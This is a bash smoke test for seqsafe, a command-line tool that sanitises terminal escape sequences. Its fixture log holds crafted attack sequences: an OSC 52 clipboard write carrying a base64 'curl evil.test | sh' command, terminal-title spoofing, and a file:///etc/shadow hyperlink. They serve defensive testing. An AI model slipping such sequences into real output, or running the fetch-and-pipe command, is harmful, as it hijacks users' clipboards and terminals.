#!/usr/bin/env bash
# Smoke test: builds seqsafe, then pushes a realistic poisoned log through
# the real CLI end to end — clean/scan/explain/classes, policies, allow/deny,
# JSON gating, file I/O, C1 bypass, chunk-agnostic streaming via a pipe.
# Self-contained: temp dirs only, no network.
set -euo pipefail

cd "$(dirname "$0")/.."

fail() { echo "SMOKE FAIL: $*" >&2; exit 1; }

echo "[smoke] building..."
cargo build --quiet
BIN=target/debug/seqsafe

WORK=$(mktemp -d "${TMPDIR:-/tmp}/seqsafe-smoke.XXXXXX")
trap 'rm -rf "$WORK"' EXIT

# --- 1. version/help sanity ---------------------------------------------------
"$BIN" --version | grep -q '^seqsafe 0\.1\.0$' || fail "--version mismatch"
"$BIN" help | grep -q 'COMMANDS:' || fail "help missing COMMANDS section"
echo "[smoke] version + help ok"

# --- 2. craft a poisoned log --------------------------------------------------
# Green "ok", a clipboard write, a title change, a raw C1 erase, a device
# query, a charset switch, and a safe + an unsafe hyperlink.
printf 'build \x1b[1;32mok\x1b[0m\n' > "$WORK/poisoned.log"
printf 'payload: \x1b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\x07\x1b]0;you are safe\x07\x9b2Jtrust me\n' >> "$WORK/poisoned.log"
printf 'query \x1b[6n charset \x1b(0 link \x1b]8;;https://example.test\x1b\\docs\x1b]8;;\x1b\\ bad \x1b]8;;file:///etc/shadow\x1b\\x\x1b]8;;\x1b\\\n' >> "$WORK/poisoned.log"

# --- 3. clean: keeps styling, strips attacks ----------------------------------
"$BIN" clean "$WORK/poisoned.log" -o "$WORK/clean.log" --summary 2> "$WORK/summary.err"
grep -q $'\x1b\[1;32mok' "$WORK/clean.log" || fail "SGR color was not preserved"
grep -q $'\x1b]8;;https://example.test' "$WORK/clean.log" || fail "safe hyperlink lost"
if grep -q ']52;' "$WORK/clean.log"; then fail "clipboard write survived clean"; fi
if grep -q 'you are safe' "$WORK/clean.log"; then fail "title change survived clean"; fi
if grep -q $'\x9b' "$WORK/clean.log"; then fail "raw C1 byte survived clean"; fi
if grep -q 'file:///etc/shadow' "$WORK/clean.log"; then fail "file: hyperlink survived clean"; fi
grep -q 'trust me' "$WORK/clean.log" || fail "plain text was lost"
grep -q 'sequence(s) kept' "$WORK/summary.err" || fail "--summary missing on stderr"
echo "[smoke] clean keeps styling, strips attacks"

# --- 4. cleaning is idempotent ------------------------------------------------
"$BIN" clean "$WORK/clean.log" -o "$WORK/clean2.log"
cmp -s "$WORK/clean.log" "$WORK/clean2.log" || fail "clean output is not idempotent"
echo "[smoke] clean is idempotent"

# --- 5. scan: findings, JSON, exit-code gate ----------------------------------
set +e
"$BIN" scan "$WORK/poisoned.log" > "$WORK/scan.out"
SCAN_RC=$?
set -e
[ "$SCAN_RC" = 1 ] || fail "scan of critical input exited $SCAN_RC (want 1)"
grep -q 'clipboard-write' "$WORK/scan.out" || fail "scan missing clipboard finding"
grep -q 'title-set' "$WORK/scan.out" || fail "scan missing title finding"

set +e
"$BIN" scan --json "$WORK/poisoned.log" > "$WORK/scan.json"
set -e
grep -q '"max_severity": "critical"' "$WORK/scan.json" || fail "JSON max_severity wrong"
grep -q '"class": "charset"' "$WORK/scan.json" || fail "JSON missing charset finding"

"$BIN" scan --fail-on high <<< 'plain text only' > /dev/null \
  || fail "scan of clean input must exit 0"
echo "[smoke] scan gates with exit 1 on critical, 0 on clean"

# --- 6. policies and class overrides ------------------------------------------
printf '\x1b[31mred\x1b[0m\r\n' | "$BIN" clean --policy plain > "$WORK/plain.out"
grep -q 'red' "$WORK/plain.out" || fail "plain lost the text"
if grep -q $'\x1b' "$WORK/plain.out"; then fail "plain left an escape in"; fi

printf 'hide\rshown\n' | "$BIN" clean --policy strict > "$WORK/strict.out"
grep -q '^hideshown$' "$WORK/strict.out" || fail "strict did not drop the lone CR"

printf 'x\x1b[2Ay\n' | "$BIN" clean --allow cursor > "$WORK/allow.out"
grep -q $'\x1b\[2A' "$WORK/allow.out" || fail "--allow cursor did not keep the move"

# Options without a subcommand imply clean.
printf '\x1b[31mred\x1b[0m\n' | "$BIN" --policy plain > "$WORK/implicit.out"
grep -q '^red$' "$WORK/implicit.out" || fail "flag-first invocation did not clean"
echo "[smoke] policies + --allow behave"

# --- 7. explain + classes reference -------------------------------------------
printf '\x1b]52;c;eHg=\x07' | "$BIN" explain | grep -q 'why: OSC 52' \
  || fail "explain missing rationale"
"$BIN" classes | grep -q '^sgr        keep' || fail "classes table wrong"
"$BIN" classes --allow cursor | grep -q '^cursor     keep' \
  || fail "classes did not honor --allow"
echo "[smoke] explain + classes render"

# --- 8. pipe streaming with byte-dribbled input --------------------------------
# Feed the poisoned log one byte at a time to prove chunk-boundary safety.
while IFS= read -r -n1 -d '' ch; do printf '%s' "$ch"; done < "$WORK/poisoned.log" \
  | "$BIN" > "$WORK/dribble.out"
cmp -s "$WORK/dribble.out" "$WORK/clean.log" || fail "dribbled pipe output differs"
echo "[smoke] byte-dribbled pipe matches file cleaning"

# --- 9. usage errors exit 2 ----------------------------------------------------
set +e
"$BIN" clean --policy paranoid < /dev/null 2> "$WORK/err.out"
RC=$?
set -e
[ "$RC" = 2 ] || fail "bad policy exited $RC (want 2)"
grep -q 'unknown policy' "$WORK/err.out" || fail "bad policy error message missing"

echo "SMOKE OK"
